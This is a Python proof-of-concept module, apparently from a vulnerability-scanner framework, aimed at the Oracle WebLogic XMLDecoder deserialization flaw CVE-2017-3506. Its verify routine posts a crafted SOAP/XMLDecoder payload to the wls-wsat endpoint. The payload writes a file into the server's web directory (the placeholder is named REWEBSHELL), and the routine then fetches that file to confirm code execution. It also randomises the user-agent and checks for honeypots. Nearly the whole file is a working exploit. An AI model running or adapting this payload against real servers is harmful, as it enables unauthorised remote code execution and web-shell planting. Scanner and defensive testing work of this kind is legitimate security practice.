# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Weblogic XMLDecoder反序列化漏洞（CVE-2017-3506）",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : """
            Oracle WebLogic Server10.3.6.0.0
            Oracle WebLogic Server12.1.3.0.0
            Oracle WebLogic Server12.2.1.1.0
            Oracle WebLogic Server12.2.1.2.0
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            2017年4月17日，国家信息安全漏洞共享平台（CNVD）公开了Weblogic反序列化远程代码执行漏洞（CNVD-C-2019-48814）。
            由于在反序列化处理输入信息的过程中存在缺陷，
            未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/wls-wsat/CoordinatorPortType" # url自己按需调整
        str_flag = random_str()
        filename_flag = random_str() + ".log"
        data0 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/' \
                '"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java vers' \
                'ion="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminSer' \
                'ver/tmp/_WL_internal/wls-wsat/54p17w/war/{REWEBSHELL}</string><void method="println"><string>{StrFlag}</string></' \
                'void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></' \
                'soapenv:Envelope>'.format(REWEBSHELL=filename_flag,StrFlag = str_flag)

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "text/xml",
                    }
        url1 = self.target + "/wls-wsat/" + filename_flag
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if str_flag in req1.text:#req.status_code == 200 and :
                vuln = [True,req1.text]
            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()